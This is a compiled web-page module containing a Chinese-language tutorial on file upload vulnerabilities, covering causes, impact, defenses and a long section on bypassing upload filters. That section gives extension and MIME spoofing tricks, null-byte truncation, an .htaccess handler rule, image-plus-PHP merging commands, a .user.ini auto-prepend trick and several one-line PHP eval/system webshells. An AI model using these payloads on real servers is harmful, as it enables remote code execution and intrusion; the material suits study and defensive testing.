import{_ as e,W as t,X as a,a1 as i}from"./framework-b6a07282.js";const l="/assets/1-b91c5d96.jpg",n="/assets/2-5df163cd.jpg",s="/assets/3-5ee42df5.jpg",d={},p=i(`<h2 id="文件上传漏洞" tabindex="-1"><a class="header-anchor" href="#文件上传漏洞" aria-hidden="true">#</a> 文件上传漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>文件上传漏洞是指用户上传了一个可执行的脚本文件，而且通过这个脚本文件获得了执行服务器命令的能力。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ol><li>服务器配置不当，比如没有限制上传文件的类型、大小、路径等。</li><li>代码功能存在缺陷，比如没有对上传文件的内容进行校验或者过滤。</li><li>程序逻辑错误，比如没有对用户上传的文件名进行检查或者转义。</li><li>黑客利用绕过技术，比如修改请求头、伪造MIME类型、使用双写扩展名等</li></ol><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><p>在具备文件上传功能的网站中尝试：</p><ul><li><p>手动测试网站的文件上传功能，尝试修改请求参数、文件名、后缀、文件内容等，看是否能成功上传并执行恶意代码。</p></li><li><p>利用一些工具或者扫描器，如burpsuite、awvs等，对网站进行扫描，查看是否有文件上传功能或者漏洞。</p></li></ul><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ol><li>服务器端代码执行，攻击者可以通过上传的脚本文件控制服务器。</li><li>服务器端请求伪造，攻击者可以利用上传的脚本文件发起内网请求或攻击其他网站。</li><li>跨站脚本攻击，攻击者可以通过上传的恶意文件诱导其他用户访问并执行恶意代码。</li></ol><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><ol><li>修改文件名或后缀，利用服务器对文件类型的判断不严格或者大小写敏感等特点，绕过黑白名单或者正则表达式等过滤机制。 如：大小写、双写、替换后缀名。</li><li>修改文件内容或格式，利用服务器对文件内容的解析不完整或者存在漏洞等特点，插入恶意代码或者构造特殊格式的文件。 如：将木马写入jpg文件，然后利用文件包含或.htaccess文件执行。</li><li>修改请求参数或头部，利用服务器对请求参数或头部的处理不正确或者存在逻辑错误等特点，修改Content-Type、Content-Disposition、Boundary等字段。</li><li>利用其他功能或漏洞，结合服务器提供的其他功能如编辑器、图片处理、压缩解压等功能，或者利用其他已知漏洞如任意文件读取、任意文件包含、命令执行等漏洞。</li></ol><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><p>文件上传漏洞主要是从服务器端和客户端两个方面进行防御。</p><p>服务器端的防御方法包括：</p><ol><li>检查文件上传路径，避免目录遍历、文件夹解析、截断等漏洞。</li><li>检查文件扩展名，使用白名单而不是黑名单，避免大小写敏感、正则表达式绕过等问题。</li><li>文件内容头校验（GIF89a） 并且检查文件内容和格式，使用二进制方式读取文件头，避免图片中插入webshell等问题。</li><li>检查请求参数和头部，验证MIME类型校验（Content-Type）、Content-Disposition、Boundary等字段，避免修改请求绕过检测。</li><li>重命名上传的文件，使用随机字符串或时间戳等方式，防止攻击者得到webshell的路径。</li><li>隐藏或限制上传路径的访问权限，并且将上传的文件权限设置为不可执行或不可解析，防止攻击者直接访问webshell。</li><li>对上传的文件进行重新渲染。上传的文件被重新渲染了是指服务器对上传的文件进行了二次处理，比如压缩、裁剪、转换格式等，从而改变了文件的内容和结构。</li></ol><p>客户端的防御方法包括：</p><ol><li>使用HTTPS协议传输数据，防止中间人攻击篡改数据。</li><li>使用验证码或CSRF Token等方式验证用户身份，防止恶意用户伪造请求。</li><li>使用JavaScript或HTML5等技术对上传的文件进行预处理和校验，减轻服务器端的压力。</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>删除/禁用JS、修改MIME、等价扩展名、大小写、 htaccess、双写、空格、点、::$DATA、%00截断、0x00截 断、图片马、条件竞争等等</li></ul><h4 id="修改后缀" tabindex="-1"><a class="header-anchor" href="#修改后缀" aria-hidden="true">#</a> 修改后缀</h4><ul><li>在服务器会检查后缀名是否为jpg或其他特定格式，不允许php这种后缀名文件的上传，此时我们就需要修改后缀名来实现文件上传。</li></ul><h5 id="可解析后缀" tabindex="-1"><a class="header-anchor" href="#可解析后缀" aria-hidden="true">#</a> 可解析后缀</h5><ul><li>有很多语言都有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全，可尝试以下扩展名。</li></ul><table><thead><tr><th style="text-align:center;">语言</th><th style="text-align:center;">可解析后缀</th></tr></thead><tbody><tr><td style="text-align:center;">asp/aspx</td><td style="text-align:center;">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td></tr><tr><td style="text-align:center;">php</td><td style="text-align:center;">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td></tr><tr><td style="text-align:center;">jsp</td><td style="text-align:center;">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td></tr></tbody></table><h5 id="后缀加空格-php-5-17可以" tabindex="-1"><a class="header-anchor" href="#后缀加空格-php-5-17可以" aria-hidden="true">#</a> 后缀加空格 PHP 5.17可以</h5><h4 id="mime类型" tabindex="-1"><a class="header-anchor" href="#mime类型" aria-hidden="true">#</a> MIME类型</h4><ul><li>是一种标准，用来表示文档、文件或字节流的性质和格式。</li><li>Content-Type中修改</li></ul><h5 id="常见的mine类型" tabindex="-1"><a class="header-anchor" href="#常见的mine类型" aria-hidden="true">#</a> 常见的MINE类型</h5><table><thead><tr><th style="text-align:left;">类型</th><th style="text-align:left;">描述</th><th style="text-align:left;">典型示例</th></tr></thead><tbody><tr><td style="text-align:left;">text</td><td style="text-align:left;">表明文件是普通文本，理论上是人类可读</td><td style="text-align:left;"><code>text/plain</code>, <code>text/html</code>, <code>text/css, text/javascript</code></td></tr><tr><td style="text-align:left;">image</td><td style="text-align:left;">表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型</td><td style="text-align:left;"><code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/bmp</code>, <code>image/webp</code>, <code>image/x-icon</code>, <code>image/vnd.microsoft.icon</code></td></tr><tr><td style="text-align:left;">audio</td><td style="text-align:left;">表明是某种音频文件</td><td style="text-align:left;"><code>audio/midi</code>, <code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code></td></tr><tr><td style="text-align:left;">video</td><td style="text-align:left;">表明是某种视频文件</td><td style="text-align:left;"><code>video/webm</code>, <code>video/ogg</code></td></tr><tr><td style="text-align:left;">application</td><td style="text-align:left;">表明是某种二进制数据</td><td style="text-align:left;"><code>application/octet-stream</code>, <code>application/pkcs12</code>, <code>application/vnd.mspowerpoint</code>, <code>application/xhtml+xml</code>, <code>application/xml</code>, <code>application/pdf</code></td></tr></tbody></table><h5 id="mime用法" tabindex="-1"><a class="header-anchor" href="#mime用法" aria-hidden="true">#</a> MIME用法</h5><ul><li><p>客户端使用：</p><ol><li>GET请求不需要这个字段。</li><li>POST请求头，放在Content Type字段用来指定上传的 文件类型，方便服务器解析。放在Accept，告诉服务端允许 接收的响应类型。比如只能接收json或者其他。</li></ol></li><li><p>服务端使用：</p><ol><li>放在响应头里面，Content Type告诉客户端响应的数据 类型，方便客户端解析</li></ol></li></ul><h5 id="mime绕过方法" tabindex="-1"><a class="header-anchor" href="#mime绕过方法" aria-hidden="true">#</a> MIME绕过方法</h5><p>MIME限制绕过方法</p><ul><li>将php文件改名为jpg后缀，上传时就会默认设置托i按格式MIME，抓包修改文件名后缀为php即可</li><li>选择php文件上传，抓包修改上传表单部分的Content-Type为image/jpeg即可</li></ul><h4 id="htaccess" tabindex="-1"><a class="header-anchor" href="#htaccess" aria-hidden="true">#</a> .htaccess</h4><ul><li>.htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。</li><li>通过 .htaccess 文件，可以实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者 目录的访问、禁止目录列表、配置默认文档等功能</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;FilesMatch &quot;shell1.jpg&quot;&gt;
	Sethandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="系统名绕过" tabindex="-1"><a class="header-anchor" href="#系统名绕过" aria-hidden="true">#</a> 系统名绕过</h4><ul><li><p>操作系统中，有一些字体在后缀名中自动忽略。所以在上传的时候可以加上这些字体，等到服务器保存该文件时，系统会自动抹去这些字体。所以通过这种方式可绕过后缀名检查。</p></li><li><p>在Windows系统中，可以尝试上传这些：</p></li></ul><ol><li><code>index.php.会重命名为 index.php</code></li><li><code>index.php%20会重命名为index.php</code></li><li><code>index.php:1.jpg会重命名为index.php</code></li><li><code>index.php::$DATA会重命名为index.php</code></li></ol><ul><li>在Linux系统中，可以尝试上传这些：</li><li>index.php/.</li><li>./aa/../index.php/.</li></ul><h4 id="文件名截断" tabindex="-1"><a class="header-anchor" href="#文件名截断" aria-hidden="true">#</a> 文件名截断</h4><ul><li>文件名截断的原理是利用ascii码值为0的字符（\\0或%00）来截断字符串，因为操作系统在识别字符串时，当读取到这个字符时，就认为读取到了一个字符串的结束符号。</li><li>例如，如果我们想要上传一个php文件，但服务器只允许jpg文件，我们可以把我们的php文件命名为shell.php%00.jpg，这样服务器在保存文件时，会把%00后面的内容全部截断，只保留shell.php作为文件名。</li></ul><img src="`+l+'" style="zoom:80%;"><ol start="2"><li></li></ol><img src="'+n+'" style="zoom:80%;"><img src="'+s+`" style="zoom:80%;"><h4 id="文件头检测" tabindex="-1"><a class="header-anchor" href="#文件头检测" aria-hidden="true">#</a> 文件头检测</h4><ul><li>有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</li></ul><table><thead><tr><th>类型</th><th>16进制</th><th>ASCII</th></tr></thead><tbody><tr><td>JPG</td><td>FF D8 FF E0 00 10 4A 46 49 46</td><td>ÿØÿàJFIF</td></tr><tr><td>GIF</td><td>47 49 46 38 39 61</td><td>GIF89a</td></tr><tr><td>PNG</td><td>89 50 4E 47</td><td>PNG</td></tr><tr><td>TIF</td><td>49 49 2A 00</td><td>II*</td></tr><tr><td>BMP</td><td>42 4D</td><td>BM</td></tr></tbody></table><p>GIF89a</p><h4 id="图片码-文件包含" tabindex="-1"><a class="header-anchor" href="#图片码-文件包含" aria-hidden="true">#</a> 图片码+文件包含</h4><p>windwos生成：copy tupian.jpg /b + 1.php /a 1.jpg</p><p>linux生成：cat tupian.jpg 1.php &gt;1.jpg</p><h5 id="文件重新渲染" tabindex="-1"><a class="header-anchor" href="#文件重新渲染" aria-hidden="true">#</a> 文件重新渲染</h5><ul><li>如果文件重新渲染了，要找到一个将一句话插入图片重新渲染后还存在的位置。</li><li>自备图片</li></ul><h4 id="竞争上传" tabindex="-1"><a class="header-anchor" href="#竞争上传" aria-hidden="true">#</a> 竞争上传</h4><ul><li>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;1.php&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&lt;?php @eval($_POST[&quot;xy&quot;])?&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="短标签" tabindex="-1"><a class="header-anchor" href="#短标签" aria-hidden="true">#</a> 短标签</h4><ul><li>有些服务器会检查内容是否存在php等关键字，可以尝试使用段标签的方式。</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;xy&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="user-ini文件" tabindex="-1"><a class="header-anchor" href="#user-ini文件" aria-hidden="true">#</a> .user.ini文件</h4><ul><li><p>只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</p></li><li><p>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p></li><li><p>auto_prepend_file的用法：auto_prepend_file可以让所有的php文件自动的包含某个文件。</p></li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.在.user.ini中写入：
auto_prepend_file=a.jpg

2.在a.jpg中写入
&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;

那么所有php文件都会包含a.jpg。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,66),c=[p];function r(o,h){return t(),a("div",null,c)}const g=e(d,[["render",r],["__file","文件上传漏洞.html.vue"]]);export{g as default};
